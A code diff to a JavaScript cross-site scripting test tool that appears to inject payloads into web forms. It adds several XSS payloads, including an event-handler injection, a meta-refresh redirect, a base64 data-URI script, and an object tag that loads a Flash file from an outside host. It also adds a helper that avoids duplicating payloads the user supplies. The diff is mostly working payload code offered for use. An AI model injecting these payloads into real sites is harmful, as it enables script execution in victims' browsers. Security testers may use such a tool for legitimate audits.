@@ -25,7 +25,10 @@ var aPayloads = ['aaa"bbb\'ccc<ddd>zzz',
 		 'aaa\'-alert(document.domain)-\'zzz', 
 		 'aaa"-alert(document.domain)-"zzz', 
 		 'aaa"><video src onratechange=prompt(document.domain)>zzz', 
-		 'aaa"><object allowscriptaccess="always" data="http://spqr.zz.mu/xss.swf">zzz', 
+		 'aaa"><xxx onbeforescriptexecute=prompt(document.domain)>zzz', 
+		 'aaa"><object allowscriptaccess=always data=http://spqr.zz.mu/xss.swf>zzz', 
+		 'aaa"><meta http-equiv=refresh content="0;URL=http://youtu.be/dQw4w9WgXcQ">zzz', 
+		 'aaa"><form action=data:xxx;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+>zzz', 
 		 'aaa"><a href=data:xxx;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+>XSS</a>zzz']
 
 var regex = /.{0,100}aaa.{0,130}?zzz.{0,100}/gi
@@ -52,9 +55,14 @@ window.addEventListener
 				{
 					if (isNaN (+sPrompt))
 					{
-						aPayloads.push (sPrompt)
+						iPayload = InArray (aPayloads, sPrompt)
 						
-						iPayload = aPayloads.indexOf (sPrompt)
+						if (iPayload == -1)
+						{
+							aPayloads.push (sPrompt)
+							
+							iPayload = aPayloads.indexOf (sPrompt)
+						}
 					}
 					else
 						iPayload = parseInt (sPrompt) % aPayloads.length
@@ -160,4 +168,13 @@ function fillForm (form)
 function htmlEncode (str)
 {
 	return str.replace (/</g, '&lt;').replace (/>/g, '&gt;').replace (/"/g, '&quot;').replace (/'/g, '&#39;')
+}
+
+function InArray (arr, elem)
+{
+	for (var i = 0; i < arr.length; i++)
+		if (arr [i].indexOf (elem) + 1)
+			return i
+	
+	return -1
 }
